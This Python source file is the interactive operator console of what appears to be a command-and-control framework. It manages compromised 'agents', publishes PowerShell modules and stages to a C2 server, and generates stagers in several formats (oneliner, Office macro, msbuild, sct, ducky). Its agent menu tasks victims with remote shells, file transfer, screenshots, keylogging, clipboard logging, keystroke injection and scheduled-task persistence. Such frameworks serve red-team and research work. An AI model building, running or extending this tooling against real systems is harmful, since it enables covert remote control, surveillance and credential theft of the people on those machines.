# -*- coding: utf8 -*-
import config as cfg
from lib import helpers
import readline
import cmd
import os.path
from sys import platform as _platform

# Fix OSX platform bug with readline library
if _platform == "darwin":
	import readline
	#import rlcompleter
	if 'libedit' in readline.__doc__:
	    readline.parse_and_bind("bind ^I rl_complete")
	else:
	    readline.parse_and_bind("tab: complete")

# Fix the use of the "-" as a delimiter
old_delims = readline.get_completer_delims()
readline.set_completer_delims(old_delims.replace('-', ''))

#****************************************************************************************
# Class handling console main menu interactions
#****************************************************************************************
class MainMenu(cmd.Cmd):
	
	#------------------------------------------------------------------------------------
	def __init__(self, mainHandler, agentHandler, statusHandler):
		cmd.Cmd.__init__(self)
		self.mainHandler = mainHandler
		self.agentHandler = agentHandler
		self.statusHandler = statusHandler
		self.prompt = "[main]#> "
	
	#------------------------------------------------------------------------------------	
	def do_shell(self, args):
		"""shell <os command>\nor\n! <os command>\nExecute a shell command on the local system"""
		os.system(args)
		
	#------------------------------------------------------------------------------------	
	def do_list(self, args):
		"""Show the list of all discovered agents with their current status"""
		helpers.printAgentList(self.statusHandler.agentList)
	
	#------------------------------------------------------------------------------------	
	def do_listPublishedStage(self, args):
		"""Show the list of all published stages with their public link"""
		helpers.printStageList(self.statusHandler.publishedStageList)

	#------------------------------------------------------------------------------------	
	def do_listPublishedModules(self, args):
		"""Show the list of all published modules with their public link"""
		helpers.printModuleList(self.statusHandler.publishedModuleList)
		
	#------------------------------------------------------------------------------------
	def do_use(self, args):
		"""use <agentID>\nSelect the current agent to work with. Must be an ACTIVE or SLEEPING agent"""
		
		# Checking args
		if not args:
			print helpers.color("[!] Please specify an agent ID. Command format: use <agentID>")
			return
		
		agentID = args.split()[0]

		if self.statusHandler.agentIsKnown(agentID):
			if self.statusHandler.agentIsDead(agentID):
				print helpers.color("[!] Cannot use a 'DEAD' agent. Check for ALIVE or SLEEPING agent using the 'list' command")
				return
				
			print helpers.color("[*] Using agent ID [{}]".format(agentID))
			self.agentHandler.agentID = agentID
			agentMenu = AgentMenu(self.agentHandler, self.statusHandler)
			agentMenu.cmdloop()
		else:
			print helpers.color("[!] Unkown agent ID [{}]".format(agentID))

	#------------------------------------------------------------------------------------
	def complete_use(self, text, line, startidx, endidx):
		return [agentID for agentID in self.statusHandler.agentList if self.statusHandler.agentIsAlive(agentID) and agentID.startswith(text)]
	
	#------------------------------------------------------------------------------------
	def do_publishStage(self, args):
		"""publishStage <agent stage> [stage name]\nPublish an agent stage on the C2 server.\nAn optionnal name can be provided to distinguish between various published stages"""

		# Checking args
		if not args:
			print helpers.color("[!] Please specify a stage file. Command format: publishStage <agent stage> [stage name]")
			return

		arguments = args.split()
		agentStageFile = arguments[0]		
		stageName = arguments[1] if len(arguments) > 1 else "default"

		agentPath = os.path.join(cfg.defaultPath['agentRelease'], agentStageFile)
		if not os.path.isfile(agentPath):
			print helpers.color("[!] Unable to find stage file [{}] in the default agent release PATH".format(agentPath))
			return

		self.mainHandler.publishStage(agentPath, stageName)

	#------------------------------------------------------------------------------------
	def complete_publishStage(self, text, line, startidx, endidx):
		agentReleasePath = cfg.defaultPath['agentRelease']
		return [f for f in os.listdir(agentReleasePath) if os.path.isfile(os.path.join(agentReleasePath,f)) and f.startswith(text)]

	#------------------------------------------------------------------------------------	
	def do_deletePublishedStage(self, args):
		"""deletePublishedStage <stage name>\nDelete a published stage file from the C2 server"""
		
		# Checking args
		if not args:
			print helpers.color("[!] Please specify a stage name. Command format: deletePublishedStage <stage name>")
			return

		stageName = args.split()[0]

		if not stageName in self.statusHandler.publishedStageList:
			print helpers.color("[!] Please specify a valid stage name. You can use 'listPublishedStage' to see them")
			return

		r = raw_input(helpers.color("[?] Delete published stage [{}]? [Y/n] ".format(stageName)))
		if r.lower() in ['','y']:
			self.mainHandler.deletePublishedStage(stageName)

	#------------------------------------------------------------------------------------
	def complete_deletePublishedStage(self, text, line, startidx, endidx):
		return [a for a in self.statusHandler.publishedStageList if a.startswith(text)]

	#------------------------------------------------------------------------------------
	def do_publishModule(self, args):
		"""publishModule <module file>\nPublish a PowerShell module the C2 server so it can later be used by an agent"""

		# Checking args
		if not args:
			print helpers.color("[!] Please specify a module file. Command format: publishModule <module file>")
			return

		arguments = args.split()
		moduleFile = arguments[0]
		moduleName = os.path.splitext(moduleFile)[0]

		modulePath = os.path.join(cfg.defaultPath['modules'], moduleFile)
		if not os.path.isfile(modulePath):
			print helpers.color("[!] Unable to find module file [{}] in the default modules PATH".format(modulePath))
			return

		self.mainHandler.publishModule(modulePath, moduleName)

	#------------------------------------------------------------------------------------
	def complete_publishModule(self, text, line, startidx, endidx):
		modulePath = cfg.defaultPath['modules']
		return [f for f in os.listdir(modulePath) if os.path.isfile(os.path.join(modulePath,f)) and f.startswith(text) and f.endswith(".ps1")]

	#------------------------------------------------------------------------------------	
	def do_deletePublishedModule(self, args):
		"""deletePublishedModule <module name>\nDelete a published module file from the C2 server"""
		
		# Checking args
		if not args:
			print helpers.color("[!] Please specify a module name. Command format: deletePublishedModule <module name>")
			return

		moduleName = args.split()[0]

		if not moduleName in self.statusHandler.publishedModuleList:
			print helpers.color("[!] Please specify a valid module name. You can use 'listPublishedModule' to see them")
			return

		r = raw_input(helpers.color("[?] Delete published module [{}]? [Y/n] ".format(moduleName)))
		if r.lower() in ['','y']:
			self.mainHandler.deletePublishedModule(moduleName)

	#------------------------------------------------------------------------------------
	def complete_deletePublishedModule(self, text, line, startidx, endidx):
		return [moduleName for moduleName in self.statusHandler.publishedModuleList if moduleName.startswith(text)]

	#------------------------------------------------------------------------------------
	def do_genStager(self, args):
		"""genStager <oneliner|batch|macro|msbuild|javascript|ducky|sct> <stage name>\nGenerates a stager of the selected type using a specific published stage name"""

		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky|sct> <stage name>")
			return

		arguments = args.split()
		if len(arguments) < 2:
			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky|sct> <stage name>")
			return

		stagerType = arguments[0]
		stageName = arguments[1]

		if stagerType not in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky', 'sct']:
			print helpers.color("[!] Invalid stager type")
			return

		if not self.statusHandler.isValidStage(stageName):
			print helpers.color("[!] Invalid stage: wrong name or no shared URL found")
			return

		self.mainHandler.genStager(stagerType, stageName)

	#------------------------------------------------------------------------------------
	def complete_genStager(self, text, line, startidx, endidx):
		result = []
		if startidx < 15:
			for stagerType in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky', 'sct']:
				if stagerType.startswith(text):
					result.append(stagerType)	
		else:
			stageList = [a for a in self.statusHandler.publishedStageList]
			for stageName in stageList:
				if stageName.startswith(text):
					result.append(stageName)
		return result

	#------------------------------------------------------------------------------------
	def do_genStager2(self, args):
		"""genStager2 <macro_sct>\nGenerates a stager itself based on a previously created stager using genStager"""

		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: genStager2 <macro_sct>")
			return

		arguments = args.split()
		stagerType = arguments[0]
		stagerArguments = ""

		if stagerType not in ['macro_sct']:
			print helpers.color("[!] Invalid stager type")
			return

		if stagerType in ['macro_sct']:
			stagerArguments = raw_input("[{}] Please provide a URL serving the SCT stager file the macro will use: ".format(stagerType))

		self.mainHandler.genStager2(stagerType, stagerArguments)

	#------------------------------------------------------------------------------------
	def complete_genStager2(self, text, line, startidx, endidx):
		return [s for s in ['macro_sct'] if s.startswith(text)]
		
	#------------------------------------------------------------------------------------
	def do_taskList(self, args):
		"""Show the list of all pending tasks assigned to any agent"""		
		helpers.printPendingTaskList(self.statusHandler.pendingTaskList)
			
	#------------------------------------------------------------------------------------
	def do_exit(self, args):
		"""Exit the program"""
		raise KeyboardInterrupt
		return True
		
	#------------------------------------------------------------------------------------
	def do_help(self, args):
		"""Show the help menu"""
		cmd.Cmd.do_help(self, args)
	
	#------------------------------------------------------------------------------------
	def emptyline(self):
		pass
		
	#------------------------------------------------------------------------------------
	def default(self, line):
		print (">>> Unknown command. Type 'help' or '?' to get a list of available commands.")
		
#****************************************************************************************
# Class handling console agent menu interactions
#****************************************************************************************		
class AgentMenu(cmd.Cmd):

	#------------------------------------------------------------------------------------
	def __init__(self, agentHandler, statusHandler):
		cmd.Cmd.__init__(self)
		self.agentHandler = agentHandler
		self.statusHandler = statusHandler
		self.prompt = "[{:.10}]#> ".format(self.agentHandler.agentID)
	
	#------------------------------------------------------------------------------------	
	def do_back(self, args):
		"""Go back to the main menu"""
		return True
		
	#------------------------------------------------------------------------------------
	def do_use(self, args):
		"""use <agentID>\nSelect the current agent to work with. Must be an ACTIVE or SLEEPING agent"""
		
		# Validate arguments: should be an valid agentID
		if not args:
			print helpers.color("[!] Please specify an agent ID. Command format: use <agentID>")
			return
		
		agentID = args.split()[0]

		if self.statusHandler.agentIsKnown(agentID):
			if self.statusHandler.agentIsDead(agentID):
				print helpers.color("[!] Cannot use a 'DEAD' agent. Check for ALIVE or SLEEPING agent using the 'list' command")
				return
				
			print helpers.color("[*] Using agent ID [{}]".format(agentID))
			self.agentHandler.agentID = agentID
			self.prompt = "[{:.10}]#> ".format(agentID)
		else:
			print helpers.color("[!]Unkown agent ID [{}]".format(agentID))
	
	#------------------------------------------------------------------------------------
	def complete_use(self, text, line, startidx, endidx):
		return [agentID for agentID in self.statusHandler.agentList if self.statusHandler.agentIsAlive(agentID) and agentID.startswith(text)]

	#------------------------------------------------------------------------------------	
	def do_list(self, args):
		"""Show the list of all discovered agents with their current status"""
		helpers.printAgentList(self.statusHandler.agentList)

	#------------------------------------------------------------------------------------
	def do_taskList(self, args):
		"""Show the list of all pending tasks assigned to the current agent"""
		helpers.printPendingTaskList(self.statusHandler.pendingTaskList, self.agentHandler.agentID)
		
	#------------------------------------------------------------------------------------
	def do_cmd(self, args):
		"""Switches to the CLI command mode to task current agent with some CLI commands (cmd.exe)"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return

		userCmd = raw_input("Command: ")
		if userCmd:
			self.agentHandler.taskAgentWithCLI(userCmd)

	#------------------------------------------------------------------------------------
	def do_shell(self, args):
		"""Switches to an interactive shell on the agent side. The shell process is not killed until you 'exit' it"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return

				# Shorten the polling period for a more interactive and fast experience
		self.statusHandler.pollingPeriod = 2
		print helpers.color("[*] Temporarily change polling period to 2 seconds for a faster interaction")
		print helpers.color("[*] Entering interactive shell. Environment is persistent between commands and child process is not killed until you exit it")

		userCmd = ""
		while userCmd != "exit":	
			userCmd = raw_input("PS> ")
			if userCmd:
				if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
					print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
				else:
					self.agentHandler.taskAgentWithShell(userCmd)

		# Restore the default polling period
		print helpers.color("[*] Restoring default polling period")
		self.statusHandler.pollingPeriod = cfg.defaultPollingPeriod
	
	#------------------------------------------------------------------------------------
	def do_launchProcess(self, args):
		"""launchProcess <executable name or path> [arguments]\nInstruct the agent to launch a process in the background, with the given executable name and the optionnal arguments"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return
			
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: launchProcess <executable name or path> [arguments]")
			return
		
		try:
			arguments = helpers.retrieveQuotedArgs(args,2)
		except ValueError as e:
			print helpers.color("[!] Wrong arguments format: {}".format(e))
			return
	
		# Path normalization for Windows
		exePath = arguments[0].replace("/","\\")
		parameters = arguments[1] if len(arguments) > 1 else " "
		
		self.agentHandler.taskAgentWithLaunchProcess(exePath, parameters)

	#------------------------------------------------------------------------------------
	def do_runPSModule(self, args):
		"""runPSModule <module name> [arguments]\nLoads a *published* PowerShell module with optionnal arguments, and optionnaly get a CLI to interact with it"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return
			
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: runPSModule <module name> [arguments]")
			return
			
		# Retrieve arguments		
		arguments = args.split(' ',1)
		moduleName = arguments[0]
		moduleArgs = arguments[1] if len(arguments) > 1 else None
		
		# Check if the module is valid and published
		if not self.statusHandler.isValidModule(moduleName):
			print helpers.color("[!] Please specify a valid module. You can use 'listPublishedModule' to see them")
			return
		
		# Ask the user if he wants an interactive shell with the module loaded
		r = raw_input(helpers.color("[?] Once module loaded, do you want to get a powershell CLI to interact with it (y/N)?"))
		if r.lower() == "y":
			self.agentHandler.taskAgentWithRunPSModule(moduleName, moduleArgs, True)
			print helpers.color("[*] Please wait while the module is being loaded and a shell returned...")
			userCmd = ""
			while userCmd != "exit":	
				userCmd = raw_input("PS> ")
				if userCmd:
					if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
						print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
					else:
						self.agentHandler.taskAgentWithShell(userCmd)
		else:
			self.agentHandler.taskAgentWithRunPSModule(moduleName, moduleArgs)

	#------------------------------------------------------------------------------------
	def complete_runPSModule(self, text, line, startidx, endidx):
		return [moduleName for moduleName in self.statusHandler.publishedModuleList if moduleName.startswith(text)]
		
	#------------------------------------------------------------------------------------
	def do_sleep(self, args):
		"""sleep <amount of time>\nInstruct the current agent to sleep for a given amount of time. Amount of time is a combination of days, hours and minutes:\nsleep [0-infinite]d[0-23]h[0-59]m\nExample:\nsleep 1d12h45m"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked (either because it's DEAD or already tasked with something)")
			return
			
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: sleep <amount of time>")
			return
		try:
			days = args[0:args.index('d')]
			hours = args[args.index('d')+1:args.index('h')]
			minutes = args[args.index('h')+1:args.index('m')]
		except ValueError:
			print helpers.color("[!] Wrong format for 'amount of time'. Must be a combination of days, hours and minutes:\nsleep [0-infinite]d[0-23]h[1-59]m\nExample: sleep 1d12h45m")
			return
		
		if not helpers.stringIsInt(days) or not helpers.stringIsInt(hours) or not helpers.stringIsInt(minutes):
			print helpers.color("[!] Wrong format for 'amount of time'. Must be a combination of days, hours and minutes:\nsleep [0-infinite]d[0-23]h[1-59]m\nExample: sleep 1d12h45m")
			return
		
		sleepTime = int(days)*86400 + int(hours)*60 + int(minutes)
		if sleepTime == 0: print helpers.color("[!] Wrong 'amount of time': Agent cannot sleep for 0 minute, must be at least 1 minute")
		else: self.agentHandler.taskAgentWithSleep(sleepTime)
		
	#------------------------------------------------------------------------------------
	def do_polling(self, args):
		"""polling <period> [deviation]\nSet the current agent polling period (seconds), with an optionnal deviation (percentage) between 10 and 50"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked (either because it's DEAD or already tasked with something)")
			return
		
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: polling <period> [deviation]")
			return
		
		try:
			arguments = helpers.retrieveQuotedArgs(args,2)
		except ValueError as e:
			print helpers.color("[!] Wrong arguments format: {}".format(e))
			return

		try:
			period = int(arguments[0])
			deviation = int(arguments[1]) if len(arguments) > 1 else 50
		except ValueError:
			print helpers.color("[!] Arguments must be proper integers")
			return
		
		if period < 0:
			print helpers.color("[!] Period cannot be a negative number")
			return
		if deviation not in range(10,51):
			print helpers.color("[!] Deviation can only be between 10 and 50%")
			return
			
		self.agentHandler.taskAgentWithNewPolling(period, deviation)
		
	#------------------------------------------------------------------------------------
	def do_sendFile(self, args):
		"""sendFile <local file> [destination directory]\nSend a local file to the current agent. If no destination directory is provided, %TEMP% is used"""

		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked (either because it's DEAD or already tasked with something)")
			return
		
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: sendFile <local file> [destination path]")
			return
		
		try:
			arguments = helpers.retrieveQuotedArgs(args,2)
		except ValueError as e:
			print helpers.color("[!] Wrong arguments format: {}".format(e))
			return
	
		localFile = arguments[0]
		
		# Path normalization for Windows
		if len(arguments) > 1:
			# Add a trailing backslash if missing and replace forward slashes to backslashes
			destinationPath = arguments[1].replace("/","\\") + "\\" if arguments[1][-1] != "\\" else arguments[1].replace("/","\\")
		else:
			destinationPath = "temp"
		
		if os.path.isfile(localFile):
				self.agentHandler.taskAgentWithSendFile(localFile, destinationPath)
		else:
			print helpers.color("[!] Unable to find local file [{}] in the default PATH".format(localFile))
		
	#------------------------------------------------------------------------------------
	def complete_sendFile(self, text, line, startidx, endidx):
		result = []
		for f in os.listdir('.'):
			if os.path.isfile(f) and f.startswith(text):
				if f.count(' ') > 0:
					result.append('"' + f + '"')
				else:
					result.append(f)
		return result

	#------------------------------------------------------------------------------------
	def do_getFile(self, args):
		"""getFile <agent local file>\nDownload a file from the agent to the local system"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return
		
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: getFile <agent local file>")
			return
		
		try:
			arguments = helpers.retrieveQuotedArgs(args,1)
		except ValueError as e:
			print helpers.color("[!] Wrong arguments format: {}".format(e))
			return

		# Path normalization for Windows
		filePath = arguments[0].replace("/","\\")
		
		self.agentHandler.taskAgentWithGetFile(filePath)

	#------------------------------------------------------------------------------------
	def do_screenshot(self, args):
		"""screenshot\nTake a screenshot of the agent screen, in JPG format, and download it"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return

		self.agentHandler.taskAgentWithScreenshot()

	#------------------------------------------------------------------------------------
	def do_keylogger(self, args):
		"""keylogger <start|stop>\nStart or stops a keylogger"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return
			
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: keylogger <start|stop>")
			return
			
		# Retrieve arguments
		if args not in ['start', 'stop']:
			print helpers.color("[!] Invalid arguments. Command format: keylogger <start|stop>")
			return	
		
		self.agentHandler.taskAgentWithKeylogger(args)

	#------------------------------------------------------------------------------------
	def complete_keylogger(self, text, line, startidx, endidx):
		return [a for a in ['start', 'stop'] if a.startswith(text)]

	#------------------------------------------------------------------------------------
	def do_clipboardLogger(self, args):
		"""clipboardLogger <start|stop>\nStart or stops a clipboard logger"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return
			
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: clipboardLogger <start|stop>")
			return
			
		# Retrieve arguments
		if args not in ['start', 'stop']:
			print helpers.color("[!] Invalid arguments. Command format: keylogger <start|stop>")
			return	
		
		self.agentHandler.taskAgentWithClipboardLogger(args)

	#------------------------------------------------------------------------------------
	def complete_clipboardLogger(self, text, line, startidx, endidx):
		return [a for a in ['start', 'stop'] if a.startswith(text)]

	#------------------------------------------------------------------------------------
	def do_sendKeystrokes(self, args):
		"""sendKeystrokes <process_name> <keys>\nSend specified key strokes to the process identified by its name.\nRef: https://msdn.microsoft.com/en-us/library/aa266279(v=vs.60).aspx"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked (either because it's DEAD or already tasked with something)")
			return
		
		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
			return
		
		arguments = args.split(' ',1)
		
		if len(arguments) < 2:
			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
			return
		
		procName = arguments[0]
		keyStrokes = arguments[1]

		self.agentHandler.taskAgentWithSendKeystrokes(procName, keyStrokes)

	#------------------------------------------------------------------------------------
	def do_stop(self, args):
		"""stop\nStop the current agent"""
		
		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return

		confirmation = raw_input(helpers.color("[!] Ask remote agent to stop itself? Are you sure? (y/N) "))
		if confirmation.lower() == 'y':
			self.agentHandler.taskAgentWithStop()

	#------------------------------------------------------------------------------------
	def do_persist(self, args):
		"""persist\nEnable agent persistency by the means of a scheduled task"""

		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
			return

		confirmation = raw_input(helpers.color("[!] Set agent persistency? Are you sure? (y/N) "))
		if confirmation.lower() == 'y':
			self.agentHandler.taskAgentWithPersist()

	#------------------------------------------------------------------------------------
	def complete_persist(self, text, line, startidx, endidx):
		return [a for a in self.statusHandler.publishedStageList if a.startswith(text)]

	#------------------------------------------------------------------------------------
	def do_exit(self, args):
		"""Exit the program"""
		raise KeyboardInterrupt
		return True

	#------------------------------------------------------------------------------------
	def do_help(self, args):
		"""Show the help menu"""
		cmd.Cmd.do_help(self, args)

	#------------------------------------------------------------------------------------
	def emptyline(self):
		pass
